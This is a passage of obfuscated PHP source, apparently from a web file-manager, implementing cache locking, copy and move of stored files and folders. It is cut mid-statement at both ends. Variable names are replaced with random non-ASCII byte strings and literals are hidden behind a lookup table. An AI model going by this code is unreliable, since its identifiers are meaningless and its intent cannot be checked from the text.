$˜®œîÂÌ = str_replace($åÒ“¡€ñ[529], $åÒ“¡€ñ[8], $˜®œîÂÌ); $ ““ñî = array($åÒ“¡€ñ[421] => str_replace($åÒ“¡€ñ[529], $åÒ“¡€ñ[8], $˜®œîÂÌ), $åÒ“¡€ñ[554] => intval($±­ˆêİ§[$åÒ“¡€ñ[410]]), $åÒ“¡€ñ[86] => $this->pathInfoFilter($±­ˆêİ§)); if (!$±­ˆêİ§[$åÒ“¡€ñ[410]]) { $ ““ñî[$åÒ“¡€ñ[468]] = $±­ˆêİ§[$åÒ“¡€ñ[468]]; $ ““ñî[$åÒ“¡€ñ[87]] = $±­ˆêİ§[$åÒ“¡€ñ[84]]; } $ığŒªŞâ[] = $ ““ñî; } return $ığŒªŞâ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ƒ ê¿îÛ) { $¼•ÜêéÂ =& $_SERVER[³·—™¤¢]; if (!$this->allowLock()) { return; } $this->_lockCheck($¼•ÜêéÂ[555], $ƒ ê¿îÛ); $ØöÉïß‘ = 1; $this->_lockEvent($ƒ ê¿îÛ, array($¼•ÜêéÂ[556], $¼•ÜêéÂ[557]), $ØöÉïß‘); $this->_lockParent($ƒ ê¿îÛ, array($¼•ÜêéÂ[557]), $ØöÉïß‘); $this->_lockEvent($ƒ ê¿îÛ, array($¼•ÜêéÂ[558], $¼•ÜêéÂ[559]), $ØöÉïß‘); $this->_lockCheckEnd($¼•ÜêéÂ[555], $ƒ ê¿îÛ); } public function lockCopyEnd($Ò×»§Æ¨) { $¬¿şÈñî =& $_SERVER[³·—™¤¢]; if (!$this->allowLock()) { return; } $ñôñ·” = 0; $this->_lockEvent($Ò×»§Æ¨, array($¬¿şÈñî[556], $¬¿şÈñî[557]), $ñôñ·”); $this->_lockParent($Ò×»§Æ¨, array($¬¿şÈñî[557]), $ñôñ·”); $this->_lockEvent($Ò×»§Æ¨, array($¬¿şÈñî[558], $¬¿şÈñî[559]), $ñôñ·”); } public function lockWriteStart($µÆã‚ö¾, $ÕŸô»Şæ = '') { $Æ„’Çâ =& $_SERVER[³·—™¤¢]; if (!$this->allowLock()) { return; } $this->_lockCheck($Æ„’Çâ[556], $µÆã‚ö¾); $³ıÆá÷ = 1; $this->_lockKey($Æ„’Çâ[560] . $µÆã‚ö¾ . $Æ„’Çâ[10] . $ÕŸô»Şæ, $³ıÆá÷); $this->_lockEvent($µÆã‚ö¾, array($Æ„’Çâ[555], $Æ„’Çâ[557]), $³ıÆá÷); $this->_lockParent($µÆã‚ö¾, array($Æ„’Çâ[555], $Æ„’Çâ[557]), $³ıÆá÷); $this->_lockCheckEnd($Æ„’Çâ[556], $µÆã‚ö¾); } public function lockWriteEnd($Ÿ‡ááúò, $Â«±¹ä = '') { $ÚœÛ²¦Œ =& $_SERVER[³·—™¤¢]; if (!$this->allowLock()) { return; } $–†¦Ê¯˜ = 0; $this->_lockKey($ÚœÛ²¦Œ[560] . $Ÿ‡ááúò . $ÚœÛ²¦Œ[10] . $Â«±¹ä, $–†¦Ê¯˜); $this->_lockEvent($Ÿ‡ááúò, array($ÚœÛ²¦Œ[555], $ÚœÛ²¦Œ[557]), $–†¦Ê¯˜); $this->_lockParent($Ÿ‡ááúò, array($ÚœÛ²¦Œ[555], $ÚœÛ²¦Œ[557]), $–†¦Ê¯˜); } public function lockMoveStart($ÎŸ¦úØû) { $¨Ú¾£“à =& $_SERVER[³·—™¤¢]; if (!$this->allowLock()) { return; } $this->_lockCheck($¨Ú¾£“à[557], $ÎŸ¦úØû); $‘º¤¾ = 1; $this->_lockKey($¨Ú¾£“à[561] . $ÎŸ¦úØû, $‘º¤¾); $this->_lockEvent($ÎŸ¦úØû, array($¨Ú¾£“à[555], $¨Ú¾£“à[556]), $‘º¤¾); $this->_lockParent($ÎŸ¦úØû, array($¨Ú¾£“à[555], $¨Ú¾£“à[557]), $‘º¤¾); $this->_lockEvent($ÎŸ¦úØû, array($¨Ú¾£“à[562], $¨Ú¾£“à[558], $¨Ú¾£“à[559]), $‘º¤¾); $this->_lockCheckEnd($¨Ú¾£“à[557], $ÎŸ¦úØû); } public function lockMoveEnd($ä”û—¿) { $İÔíÆå¤ =& $_SERVER[³·—™¤¢]; if (!$this->allowLock()) { return; } $‰ïà’ô¦ = 0; $this->_lockKey($İÔíÆå¤[561] . $ä”û—¿, $‰ïà’ô¦); $this->_lockEvent($ä”û—¿, array($İÔíÆå¤[555], $İÔíÆå¤[556]), $‰ïà’ô¦); $this->_lockParent($ä”û—¿, array($İÔíÆå¤[555], $İÔíÆå¤[557]), $‰ïà’ô¦); $this->_lockEvent($ä”û—¿, array($İÔíÆå¤[562], $İÔíÆå¤[558], $İÔíÆå¤[559]), $‰ïà’ô¦); } private function _lockCheck($Î†¸·¹, $µ Ì¤ôÒ) { $ì”Æ€÷ =& $_SERVER[³·—™¤¢]; $‹Ë„§èŠ = $this->sourceInfo($µ Ì¤ôÒ); $åïéÄÂ = $Î†¸·¹ . $ì”Æ€÷[10] . $µ Ì¤ôÒ; $this->_lockTimeStart[$åïéÄÂ] = timeFloat(); if (!is_array($‹Ë„§èŠ)) { return; } $¾¥´âû¦ = LNG($ì”Æ€÷[563]); CacheLock::setErrorMsg($ì”Æ€÷[162] . htmlspecialchars($‹Ë„§èŠ[$ì”Æ€÷[32]]) . $ì”Æ€÷[164] . $¾¥´âû¦); $this->_lockKey($åïéÄÂ, 1); $this->_lockKey($åïéÄÂ, 0); $Ó£™‘Æ÷ = array_reverse($this->parentLevelArray($‹Ë„§èŠ[$ì”Æ€÷[521]])); foreach ($Ó£™‘Æ÷ as $œƒ’¿) { $åïéÄÂ = $Î†¸·¹ . $ì”Æ€÷[564] . $œƒ’¿; if (CacheLock::lockGet($ì”Æ€÷[565] . $åïéÄÂ)) { $‹Ë„§èŠ = $this->sourceInfo($œƒ’¿); CacheLock::setErrorMsg($ì”Æ€÷[162] . htmlspecialchars($‹Ë„§èŠ[$ì”Æ€÷[32]]) . $ì”Æ€÷[164] . $¾¥´âû¦); $this->_lockKey($åïéÄÂ, 1); $this->_lockKey($åïéÄÂ, 0); } } } private function _lockCheckEnd($¾ïˆ¥ÛÂ, $éêúòÔÕ) { $€—¯­ÅŸ =& $_SERVER[³·—™¤¢]; $çéÜµ·» = $¾ïˆ¥ÛÂ . $€—¯­ÅŸ[10] . $éêúòÔÕ; CacheLock::setErrorMsg($€—¯­ÅŸ[378]); if (!isset($this->_lockTimeStart[$çéÜµ·»])) { return; } $Ú—¬–±¼ = timeFloat() - $this->_lockTimeStart[$çéÜµ·»]; unset($this->_lockTimeStart[$çéÜµ·»]); if ($Ú—¬–±¼ > 0.5) { unset(self::$cacheSourceInfo[$€—¯­ÅŸ[460] . $éêúòÔÕ]); } $Úåè’«ş = $this->sourceInfo($éêúòÔÕ); if (!$Úåè’«ş) { show_json(LNG($€—¯­ÅŸ[105]), !1); } } private function _lockParent($œ¼ß‚ÒŠ, $·¯ßòŠ¥, $ÛÂ‹ïÓ) { if (!$this->autoLockSet) { return; } $¬Ë º‡Ì = $this->sourceInfo($œ¼ß‚ÒŠ); if (!is_array($¬Ë º‡Ì)) { return; } $¨ÑŸ‡Ì = array_reverse($this->parentLevelArray($¬Ë º‡Ì[$_SERVER[³·—™¤¢][521]])); foreach ($¨ÑŸ‡Ì as $æ‘‘³­Å) { $this->_lockEvent($æ‘‘³­Å, $·¯ßòŠ¥, $ÛÂ‹ïÓ); } } private function _lockEvent($İæ†ñó›, $ö·•ÊãÃ, $úÙ´»ğá) { $Šä¾ĞªÌ =& $_SERVER[³·—™¤¢]; if (!$this->autoLockSet) { return; } foreach ($ö·•ÊãÃ as $¾ÏÓØ”) { $×üø¢üÕ = $¾ÏÓØ” . $Šä¾ĞªÌ[10] . $İæ†ñó›; if ($úÙ´»ğá && CacheLock::lockGet($Šä¾ĞªÌ[565] . $×üø¢üÕ)) { continue; } $this->_lockKey($×üø¢üÕ, $úÙ´»ğá); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($«À‰Û¸Ú, $œøĞ„³ = 1) { $€±ã‚€¼ = $_SERVER[³·—™¤¢][565] . md5($«À‰Û¸Ú); if ($œøĞ„³) { if (isset(self::$_lockItemArr[$€±ã‚€¼])) { return; } self::$_lockItemArr[$€±ã‚€¼] = 1; CacheLock::lock($€±ã‚€¼, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$€±ã‚€¼])) { return; } unset(self::$_lockItemArr[$€±ã‚€¼]); CacheLock::unlock($€±ã‚€¼); } } public function isParentOf($·ô´Ò¡Û, $œÆ½¿˜ ) { $ƒ›…ÍúŸ =& $_SERVER[³·—™¤¢]; $§×³é¢Ü = $this->sourceInfo($·ô´Ò¡Û); $ãœ˜ø¾è = $this->sourceInfo($œÆ½¿˜ ); $¥›­Ìœ¨ = $§×³é¢Ü[$ƒ›…ÍúŸ[521]] . $§×³é¢Ü[$ƒ›…ÍúŸ[402]] . $ƒ›…ÍúŸ[50]; $÷«ó–ˆ™ = $ãœ˜ø¾è[$ƒ›…ÍúŸ[521]] . $ãœ˜ø¾è[$ƒ›…ÍúŸ[402]] . $ƒ›…ÍúŸ[50]; $—¢İõöÎ = strpos($÷«ó–ˆ™, $¥›­Ìœ¨) === 0; return $—¢İõöÎ; } private $targetIsDelete = 0; public function copy($öë—ó¶, $¹©÷·, $„‹ù¿ÃÜ = REPEAT_REPLACE, $¢± Òå = '') { $ñŸ‹€ =& $_SERVER[³·—™¤¢]; $àª’Úóê = $this->sourceInfo($öë—ó¶); $©Ö¹«Ö = $this->sourceInfo($¹©÷·); if (!$àª’Úóê || !$©Ö¹«Ö || $©Ö¹«Ö[$ñŸ‹€[410]] != $ñŸ‹€[88]) { return !1; } if ($this->isParentOf($öë—ó¶, $¹©÷·)) { return !1; } $×úƒ¿ü¹ = $¢± Òå ? $¢± Òå : $àª’Úóê[$ñŸ‹€[32]]; $this->lockCopyStart($öë—ó¶); $this->lockWriteStart($¹©÷·, $×úƒ¿ü¹); $şÔĞÍš— = array($ñŸ‹€[566] => array(), $ñŸ‹€[567] => array(), $ñŸ‹€[568] => array()); $this->targetIsDelete = intval($àª’Úóê[$ñŸ‹€[431]]); $À’…§ŸÆ = $this->fileNameExistCache($¹©÷·, $àª’Úóê[$ñŸ‹€[32]]); $õÑÌ£ Ê = $this->_copy($öë—ó¶, $¹©÷·, $„‹ù¿ÃÜ, $şÔĞÍš—, !0, $¢± Òå); $this->_childrenListClear(); $this->lockCopyEnd($öë—ó¶); $this->lockWriteEnd($¹©÷·, $×úƒ¿ü¹); if ($àª’Úóê[$ñŸ‹€[410]] == $ñŸ‹€[88] && $À’…§ŸÆ == $õÑÌ£ Ê) { $this->folderSizeResetChildren($À’…§ŸÆ); } Model($ñŸ‹€[569])->addAll($şÔĞÍš—[$ñŸ‹€[567]], array(), !0); if ($À’…§ŸÆ != $õÑÌ£ Ê || $àª’Úóê[$ñŸ‹€[410]] == $ñŸ‹€[88]) { Model($ñŸ‹€[570])->eventCopy($õÑÌ£ Ê); } $this->saveAll($şÔĞÍš—[$ñŸ‹€[568]]); Model($ñŸ‹€[199])->linkAdd($şÔĞÍš—[$ñŸ‹€[566]]); $this->folderSizeReset($¹©÷·); $this->updateModifyTime($¹©÷·); return $õÑÌ£ Ê; } private function _copy($ïÆ«éò¸, $®—ÅåÛ», $øËÇ†™É, &$ÍÌ´¹Ñ˜, $±©³àµå, $È£Î³“Ï = '') { $‘Ú•²‰Û =& $_SERVER[³·—™¤¢]; $çÑœë³á = $this->sourceInfoCache($ïÆ«éò¸); $¦¯ñ†˜ = $çÑœë³á[$‘Ú•²‰Û[410]] == $‘Ú•²‰Û[88]; $Ûà©Ä—„ = $È£Î³“Ï ? $È£Î³“Ï : $çÑœë³á[$‘Ú•²‰Û[32]]; $õÔÔ¤ğ» = $this->fileNameExistCache($®—ÅåÛ», $Ûà©Ä—„); if ($±©³àµå) { $this->_childrenAllMake($ïÆ«éò¸); if ($¦¯ñ†˜ && $õÔÔ¤ğ») { $this->_childrenAllMake($õÔÔ¤ğ»); } } if (!$õÔÔ¤ğ») { return $this->_copyCreate($ïÆ«éò¸, $®—ÅåÛ», $Ûà©Ä—„, $ÍÌ´¹Ñ˜); } $øëïñ¦µ = $õÔÔ¤ğ»; if ($¦¯ñ†˜) { if ($øËÇ†™É == REPEAT_RENAME_FOLDER) { $Ûà©Ä—„ = $this->fileNameAutoCache($®—ÅåÛ», $Ûà©Ä—„, $øËÇ†™É, $¦¯ñ†˜); $øëïñ¦µ = $this->_copyCreate($ïÆ«éò¸, $®—ÅåÛ», $Ûà©Ä—„, $ÍÌ´¹Ñ˜); } else { $«İ•¶èÌ = $this->_childrenList($ïÆ«éò¸); foreach ($«İ•¶èÌ as $éÑÖÂ¦) { $this->_copy($éÑÖÂ¦[$‘Ú•²‰Û[402]], $õÔÔ¤ğ», $øËÇ†™É, $ÍÌ´¹Ñ˜, !1); } } } else { if ($øËÇ†™É == REPEAT_RENAME || $øËÇ†™É == REPEAT_RENAME_FOLDER) { $Ûà©Ä—„ = $this->fileNameAutoCache($®—ÅåÛ», $Ûà©Ä—„, $øËÇ†™É, $¦¯ñ†˜); $øëïñ¦µ = $this->_copyCreate($ïÆ«éò¸, $®—ÅåÛ», $Ûà©Ä—„, $ÍÌ´¹Ñ˜); } else { if ($øËÇ†™É == REPEAT_REPLACE) { $‚¬Ç„İ = $this->sourceInfoCache($õÔÔ¤ğ»); $Ñ›À£ä‚ = $this->fileHistory($‚¬Ç„İ, $çÑœë³á[$‘Ú•²‰Û[468]], $çÑœë³á[$‘Ú•²‰Û[76]]); if ($Ñ›À£ä‚) { $ÍÌ´¹Ñ˜[$‘Ú•²‰Û[566]][] = $çÑœë³á[$‘Ú•²‰Û[468]]; } } else { if ($øËÇ†™É == REPEAT_SKIP) { } } } Hook::trigger($‘Ú•²‰Û[571], array($‘Ú•²‰Û[572], $çÑœë³á, 0)); } return $øëïñ¦µ; } private function _copyCreate($¯Î«Ä¡¹, $¤“ë–æ·, $¼×°Õ¯ş, &$©¾—½·å) { $éÑ½› =& $_SERVER[³·—™¤¢]; $©Í»ÂŸ = $this->sourceInfoCache($¯Î«Ä¡¹); $÷ŠáÏŠ = $this->sourceInfoCache($¤“ë–æ·); $å£Ş‰Ú© = $this->_makeItemData($©Í»ÂŸ, $÷ŠáÏŠ, $¼×°Õ¯ş); Hook::trigger($éÑ½›[573], $å£Ş‰Ú©); Hook::trigger($éÑ½›[574], array($éÑ½›[575], $å£Ş‰Ú©, 0)); $¼ğ‘ åÍ = $this->add($å£Ş‰Ú©); $ê¾øĞ¦… = array($éÑ½›[402] => $¼ğ‘ åÍ, $éÑ½›[32] => $¼×°Õ¯ş); $this->_copyApplyMeta($ê¾øĞ¦…, $©¾—½·å); if ($©Í»ÂŸ[$éÑ½›[410]] != $éÑ½›[88]) { $©¾—½·å[$éÑ½›[566]][] = $©Í»ÂŸ[$éÑ½›[468]]; return $¼ğ‘ åÍ; } $£°‚±€® = array(); $îíÙ‹Î = array(); $this->_childrenListAll($¯Î«Ä¡¹, $£°‚±€®); $ú¸–àıÜ = count($£°‚±€®); if ($ú¸–àıÜ == 0) { return $¼ğ‘ åÍ; } $ƒÃÍ¦© = $this->sourceInfo($¼ğ‘ åÍ); foreach ($£°‚±€® as $Øë±²éø) { $Ó¡‰±Œ = $this->_makeItemData($Øë±²éø, $ƒÃÍ¦©, $Øë±²éø[$éÑ½›[32]]); $Ó¡‰±Œ[$éÑ½›[521]] = $Øë±²éø[$éÑ½›[521]]; $îíÙ‹Î[] = $Ó¡‰±Œ; } $this->chunkEventSet($éÑ½›[576], array($éÑ½›[577], $å£Ş‰Ú©, $ú¸–àıÜ)); $this->addAll($îíÙ‹Î, array(), !1); $Æ°ë¥şÅ = $this->where(array($éÑ½›[432] => $¼ğ‘ åÍ))->select(); $™ÁÉó¹× = $this->_childrenMakeRelation($£°‚±€®, $Æ°ë¥şÅ); $™ÁÉó¹×[$¯Î«Ä¡¹] = $¼ğ‘ åÍ; $›ĞÃß« = array(); $¤¸Ñ‚— = array(); foreach ($Æ°ë¥şÅ as $Øë±²éø) { $¶ÒÕ­åÏ = $Øë±²éø[$éÑ½›[402]]; $Û–é  = $this->_childrenMatch($™ÁÉó¹×, $Øë±²éø, $ƒÃÍ¦©); $›ĞÃß«[] = array($éÑ½›[402], $¶ÒÕ­åÏ, $éÑ½›[432], $Û–é [$éÑ½›[432]]); $¤¸Ñ‚—[] = array($éÑ½›[402], $¶ÒÕ­åÏ, $éÑ½›[521], $Û–é [$éÑ½›[521]]); $this->_copyApplyMeta($Øë±²éø, $©¾—½·å); if ($Øë±²éø[$éÑ½›[410]] != $éÑ½›[88]) { $©¾—½·å[$éÑ½›[566]][] = $Øë±²éø[$éÑ½›[468]]; } } $this->chunkEventSet($éÑ½›[578], array($éÑ½›[579], $å£Ş‰Ú©, $ú¸–àıÜ)); $this->saveAll($›ĞÃß«); $this->chunkEventSet($éÑ½›[580], array($éÑ½›[581], $å£Ş‰Ú©, $ú¸–àıÜ)); $this->saveAll($¤¸Ñ‚—); return $¼ğ‘ åÍ; } private function _childrenMakeRelation($§Û’¤­ , $Â’ìªÆ„) { $ø¤Ù–Ñè =& $_SERVER[³·—™¤¢]; $¸øÎİ‹ƒ = array(); $×ÒÊâ¦Ù = array(); foreach ($§Û’¤­  as $ı³ ËÀ) { $ÆÒû¦™Î = $ı³ ËÀ[$ø¤Ù–Ñè[32]] . $ø¤Ù–Ñè[8] . $ı³ ËÀ[$ø¤Ù–Ñè[521]]; $¸øÎİ‹ƒ[$ÆÒû¦™Î] = $ı³ ËÀ[$ø¤Ù–Ñè[402]]; } foreach ($Â’ìªÆ„ as $ı³ ËÀ) { $ÆÒû¦™Î = $ı³ ËÀ[$ø¤Ù–Ñè[32]] . $ø¤Ù–Ñè[8] . $ı³ ËÀ[$ø¤Ù–Ñè[521]]; $¤ö¨½´‡ = $¸øÎİ‹ƒ[$ÆÒû¦™Î]; $×ÒÊâ¦Ù[$¤ö¨½´‡] = $ı³ ËÀ[$ø¤Ù–Ñè[402]]; } return $×ÒÊâ¦Ù; } private function _childrenMatch($–İ„¶å÷, $ì­³Õú, $¾´ŸÒÀ) { $‹ä·Ş˜„ =& $_SERVER[³·—™¤¢]; $Õ‰’à¦ = $¾´ŸÒÀ[$‹ä·Ş˜„[521]]; $‚Ü…øª = $this->parentLevelArray($ì­³Õú[$‹ä·Ş˜„[521]]); foreach ($‚Ü…øª as $¯ô¥Ë¾£) { if (isset($–İ„¶å÷[$¯ô¥Ë¾£])) { $Õ‰’à¦ .= $–İ„¶å÷[$¯ô¥Ë¾£] . $‹ä·Ş˜„[582]; } } $Õ‰’à¦ = rtrim($Õ‰’à¦, $‹ä·Ş˜„[50]) . $‹ä·Ş˜„[50]; $Óñáª“ = $this->parentLevelArray($Õ‰’à¦); $Îğ©š‚« = $Óñáª“[count($Óñáª“) - 1]; return array($‹ä·Ş˜„[432] => $Îğ©š‚«, $‹ä·Ş˜„[521] => $Õ‰’à¦); } private function _makeItemData($ª«¡ÑÇã, $Ÿ‹¢¾Ö, $ŞÌ«Ïª÷) { $ÇşÙéÁÆ =& $_SERVER[³·—™¤¢]; $ğïÃòóÌ = array($ÇşÙéÁÆ[583] => $ª«¡ÑÇã[$ÇşÙéÁÆ[410]], $ÇşÙéÁÆ[420] => $ŞÌ«Ïª÷, $ÇşÙéÁÆ[584] => $ª«¡ÑÇã[$ÇşÙéÁÆ[412]] ? $ª«¡ÑÇã[$ÇşÙéÁÆ[412]] : $ÇşÙéÁÆ[12], $ÇşÙéÁÆ[469] => $ª«¡ÑÇã[$ÇşÙéÁÆ[468]] ? $ª«¡ÑÇã[$ÇşÙéÁÆ[468]] : 0, $ÇşÙéÁÆ[585] => $ª«¡ÑÇã[$ÇşÙéÁÆ[76]] ? $ª«¡ÑÇã[$ÇşÙéÁÆ[76]] : 0, $ÇşÙéÁÆ[586] => intval($Ÿ‹¢¾Ö[$ÇşÙéÁÆ[411]]), $ÇşÙéÁÆ[587] => intval($Ÿ‹¢¾Ö[$ÇşÙéÁÆ[505]]), $ÇşÙéÁÆ[588] => intval(USER_ID), $ÇşÙéÁÆ[589] => intval(USER_ID), $ÇşÙéÁÆ[401] => intval($Ÿ‹¢¾Ö[$ÇşÙéÁÆ[402]]), $ÇşÙéÁÆ[590] => $Ÿ‹¢¾Ö[$ÇşÙéÁÆ[521]] . $Ÿ‹¢¾Ö[$ÇşÙéÁÆ[402]] . $ÇşÙéÁÆ[50], $ÇşÙéÁÆ[424] => $ª«¡ÑÇã[$ÇşÙéÁÆ[85]] ? $ª«¡ÑÇã[$ÇşÙéÁÆ[85]] : time(), $ÇşÙéÁÆ[430] => 0, $ÇşÙéÁÆ[591] => $ÇşÙéÁÆ[12]); return $ğïÃòóÌ; } private function _copyApplyMeta($úèÁ½¸Õ, &$¶¢¹ìŸ) { $ÅÁÊÑ©Ê =& $_SERVER[³·—™¤¢]; $éò‘ÜûŒ = $úèÁ½¸Õ[$ÅÁÊÑ©Ê[402]]; $â¬ñ¹êè = $úèÁ½¸Õ[$ÅÁÊÑ©Ê[32]]; if (!isset($úèÁ½¸Õ[$ÅÁÊÑ©Ê[592]]) || !$úèÁ½¸Õ[$ÅÁÊÑ©Ê[592]] || $úèÁ½¸Õ[$ÅÁÊÑ©Ê[592]] == $ÅÁÊÑ©Ê[197]) { $¶¢¹ìŸ[$ÅÁÊÑ©Ê[568]][] = array($ÅÁÊÑ©Ê[402], $éò‘ÜûŒ, $ÅÁÊÑ©Ê[592], short_id($éò‘ÜûŒ)); } if (Input::check($â¬ñ¹êè, $ÅÁÊÑ©Ê[593])) { $¶¢¹ìŸ[$ÅÁÊÑ©Ê[567]][] = array($ÅÁÊÑ©Ê[402] => $éò‘ÜûŒ, $ÅÁÊÑ©Ê[94] => $ÅÁÊÑ©Ê[465], $ÅÁÊÑ©Ê[374] => str_replace($ÅÁÊÑ©Ê[53], $ÅÁÊÑ©Ê[12], Pinyin::get($â¬ñ¹êè))); $¶¢¹ìŸ[$ÅÁÊÑ©Ê[567]][] = array($ÅÁÊÑ©Ê[402] => $éò‘ÜûŒ, $ÅÁÊÑ©Ê[94] => $ÅÁÊÑ©Ê[464], $ÅÁÊÑ©Ê[374] => Pinyin::get($â¬ñ¹êè, $ÅÁÊÑ©Ê[594])); } $¶¢¹ìŸ[$ÅÁÊÑ©Ê[567]][] = array($ÅÁÊÑ©Ê[402] => $éò‘ÜûŒ, $ÅÁÊÑ©Ê[94] => $ÅÁÊÑ©Ê[444], $ÅÁÊÑ©Ê[374] => KodSort::makeStr($â¬ñ¹êè)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($›¨€“çÅ) { $•„¦“” =& $_SERVER[³·—™¤¢]; $ÃãïºÉÕ = $this->sourceInfo($›¨€“çÅ); $Ç…çÊ = $•„¦“”[595]; $³âºï… = array($•„¦“”[521] => array($•„¦“”[550], $ÃãïºÉÕ[$•„¦“”[521]] . $›¨€“çÅ . $•„¦“”[551]), $•„¦“”[431] => $this->targetIsDelete); $‚ìÍšèÖ = $this->field($Ç…çÊ)->where($³âºï…)->select(); if (!$‚ìÍšèÖ) { return; } $‚ìÍšèÖ = array_to_keyvalue($‚ìÍšèÖ, $•„¦“”[402]); foreach ($‚ìÍšèÖ as $š¤“±™­) { $î®ğ ê÷ = $š¤“±™­[$•„¦“”[432]]; $›¨€“çÅ = $š¤“±™­[$•„¦“”[402]]; if (!isset($this->_childrenListCache[$›¨€“çÅ]) && $š¤“±™­[$•„¦“”[410]] == $•„¦“”[88]) { $this->_childrenListCache[$›¨€“çÅ] = array(); } if (!isset($this->_childrenListCache[$î®ğ ê÷])) { $this->_childrenListCache[$î®ğ ê÷] = array(); } $this->_childrenListCache[$î®ğ ê÷][$›¨€“çÅ] = $š¤“±™­; $this->_childrenItemCache[$›¨€“çÅ] = $š¤“±™­; } } private function _childrenListAll($ÎÒ¡ÒÁï, &$ŠÅÈ¦ß’) { $²•“ëÊ =& $_SERVER[³·—™¤¢]; if (!isset($this->_childrenListCache[$ÎÒ¡ÒÁï])) { return; } $ÛÌ˜³ß˜ = $this->_childrenListCache[$ÎÒ¡ÒÁï]; foreach ($ÛÌ˜³ß˜ as $ƒ¹¤Ò‡Ö => $£û´ÓÖ‚) { $ŠÅÈ¦ß’[$ƒ¹¤Ò‡Ö] = $£û´ÓÖ‚; if ($£û´ÓÖ‚[$²•“ëÊ[410]] == $²•“ëÊ[88]) { $this->_childrenListAll($ƒ¹¤Ò‡Ö, $ŠÅÈ¦ß’); } } } private function sourceInfoCache($éÖ‘öâÜ) { if (isset($this->_childrenItemCache[$éÖ‘öâÜ])) { return $this->_childrenItemCache[$éÖ‘öâÜ]; } return $this->sourceInfo($éÖ‘öâÜ); } private function _childrenList($ú°¹Úˆ©) { if (isset($this->_childrenListCache[$ú°¹Úˆ©])) { return $this->_childrenListCache[$ú°¹Úˆ©]; } return $this->_childrenListSelect($ú°¹Úˆ©); } private function _childrenListSelect($µÄ•Ú²ø) { $Ä¯‚š²¦ =& $_SERVER[³·—™¤¢]; $²™Ø§ü = array($Ä¯‚š²¦[432] => $µÄ•Ú²ø, $Ä¯‚š²¦[431] => $this->targetIsDelete); $‡Ä¼ÅÛ = $this->where($²™Ø§ü)->select(); $‡Ä¼ÅÛ = $‡Ä¼ÅÛ ? $‡Ä¼ÅÛ : array(); $”¶ãéç¥ = array_to_keyvalue($‡Ä¼ÅÛ, $Ä¯‚š²¦[402]); $this->_childrenListCache[$µÄ•Ú²ø] = $”¶ãéç¥; foreach ($”¶ãéç¥ as $µÄ•Ú²ø => $ˆ—¿Úáú) { $this->_childrenItemCache[$µÄ•Ú²ø] = $ˆ—¿Úáú; } return $”¶ãéç¥; } private function fileNameExistCache($ÀÓÛı, $ø²íú¹ù) { $Àú‡³ÚÆ =& $_SERVER[³·—™¤¢]; $ø²íú¹ù = strtolower($ø²íú¹ù); $µÓ¹£‘¹ = $this->_childrenList($ÀÓÛı); foreach ($µÓ¹£‘¹ as $—ÓàËá) { if ($ø²íú¹ù == strtolower($—ÓàËá[$Àú‡³ÚÆ[32]])) { return $—ÓàËá[$Àú‡³ÚÆ[402]]; } } return !1; } private function fileNameAutoCache($«˜ÏÖîˆ, $˜€ãÒèÖ, $ç¾‡À¦, $Áñóê¢À) { $Å€ñëÌÕ =& $_SERVER[³·—™¤¢]; $øÅˆ•ê = $this->_childrenList($«˜ÏÖîˆ); $À±·ÒÆÆ = array_to_keyvalue($øÅˆ•ê, $Å€ñëÌÕ[12], $Å€ñëÌÕ[32]); return $this->fileNameAutoGet($À±·ÒÆÆ, $˜€ãÒèÖ, $ç¾‡À¦, $Áñóê¢À); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($—öû–, $ó×ßÀ›, $ï‡‚ı…§ = REPEAT_REPLACE, $íìæÔ×ˆ = '') { $¡¼Á®ö =& $_SERVER[³·—™¤¢]; $¹ÇıŞĞ = $this->sourceInfo($—öû–); $áàôŒú = $this->sourceInfo($ó×ßÀ›); if ($¹ÇıŞĞ[$¡¼Á®ö[432]] == $áàôŒú[$¡¼Á®ö[402]]) { if ($¹ÇıŞĞ[$¡¼Á®ö[431]] == $¡¼Á®ö[88]) { Model($¡¼Á®ö[429])->restore(array($—öû–)); } if (!$íìæÔ×ˆ || $íìæÔ×ˆ == $¹ÇıŞĞ[$¡¼Á®ö[32]]) { return $—öû–; } } $ûüó£÷ = $this->pathInfoMore($—öû–); if ($this->isParentOf($—öû–, $ó×ßÀ›)) { return !1; } if (!$¹ÇıŞĞ || !$áàôŒú || $áàôŒú[$¡¼Á®ö[410]] != $¡¼Á®ö[88]) { return !1; } Hook::trigger($¡¼Á®ö[596], $ûüó£÷); $this->targetIsDelete = intval($¹ÇıŞĞ[$¡¼Á®ö[431]]); if ($¹ÇıŞĞ[$¡¼Á®ö[432]] == $ó×ßÀ› && $íìæÔ×ˆ != $¹ÇıŞĞ[$¡¼Á®ö[32]]) { $É·ÇÉ¨… = $this->fileNameExist($ó×ßÀ›, $íìæÔ×ˆ); if ($É·ÇÉ¨… && $¹ÇıŞĞ[$¡¼Á®ö[410]] == $¡¼Á®ö[197]) { $‘ôÒØÓà = $this->sourceInfo($É·ÇÉ¨…); $ı‚ˆ™½† = $this->fileHistory($‘ôÒØÓà, $¹ÇıŞĞ[$¡¼Á®ö[468]], $¹ÇıŞĞ[$¡¼Á®ö[76]]); if (!$ı‚ˆ™½†) { Model($¡¼Á®ö[471])->remove($¹ÇıŞĞ[$¡¼Á®ö[468]]); } $this->removeNow($—öû–, !1); $this->folderSizeReset($ó×ßÀ›); Hook::trigger($¡¼Á®ö[597], $ûüó£÷); return $É·ÇÉ¨…; } } $ñïØª¼ = $íìæÔ×ˆ ? $íìæÔ×ˆ : $¹ÇıŞĞ[$¡¼Á®ö[32]]; $this->lockMoveStart($—öû–); $this->lockWriteStart($ó×ßÀ›, $ñïØª¼); $ù´ÈöŒî = array($¡¼Á®ö[566] => array(), $¡¼Á®ö[598] => !1); $this->clearShare($—öû–, $ó×ßÀ›); $Ô˜àÑ¶ = $this->fileNameExistCache($ó×ßÀ›, $¹ÇıŞĞ[$¡¼Á®ö[32]]); $•Í¦Æˆä = $this->_move($—öû–, $ó×ßÀ›, $ï‡‚ı…§, $ù´ÈöŒî, $íìæÔ×ˆ); $this->sourceCacheClear(); if ($¹ÇıŞĞ[$¡¼Á®ö[410]] == 